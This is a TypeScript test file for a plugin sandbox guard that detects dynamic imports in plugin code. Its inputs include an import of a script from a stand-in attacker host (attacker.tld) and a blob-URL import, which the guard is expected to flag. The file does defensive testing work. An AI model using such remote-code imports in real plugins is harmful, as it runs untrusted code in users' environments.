/// <reference types="node" />
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { dynamicImportIn } from '../../renderer/plugins/guard';

describe('the plugin sandbox guard', () => {
  test('a remote import is found', () => {
    assert.equal(dynamicImportIn('import("https://attacker.tld/x.js")'), true);
  });

  test('a blob or data import is found', () => {
    assert.equal(dynamicImportIn('const u = URL.createObjectURL(b);\nawait import(u);'), true);
  });

  test('import.meta is found', () => {
    assert.equal(dynamicImportIn('const here = import.meta.url;'), true);
  });

  test('an import inside a template hole is found', () => {
    assert.equal(dynamicImportIn('const x = `${import("./x.js")}`;'), true);
  });

  test('the word import in a string is not a call', () => {
    assert.equal(dynamicImportIn('dsmx.window.setStatusMessage("import (all) done");'), false);
  });

  test('the word import in a comment is not a call', () => {
    assert.equal(dynamicImportIn('// import(x) is not allowed here\ndsmx.macro("a", () => "x = 1");'), false);
  });

  test('a property named import is not a call', () => {
    assert.equal(dynamicImportIn('const o = { import: 1 };\no.import;'), false);
  });

  test('ordinary plugin code passes', () => {
    const main = [
      'dsmx.macro("stars", (n) => {',
      '  let out = "";',
      '  for (let i = 0; i < n; i++) out += `p${i} = (${i}, 0)\\n`;',
      '  return out;',
      '});',
    ].join('\n');
    assert.equal(dynamicImportIn(main), false);
  });
});
